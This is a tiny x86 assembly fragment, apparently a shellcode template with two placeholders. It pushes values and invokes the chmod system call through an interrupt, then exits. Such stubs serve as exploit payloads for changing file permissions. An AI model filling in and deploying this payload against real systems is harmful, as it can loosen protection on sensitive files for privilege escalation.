xor    %eax,%eax
push   %eax
{0}
mov    %esp,%edx
{1}
push   %edx
push   $0xf
pop    %eax
push   $0x2a
int    $0x80
mov    $0x01,%al
mov    $0x01,%bl
int    $0x80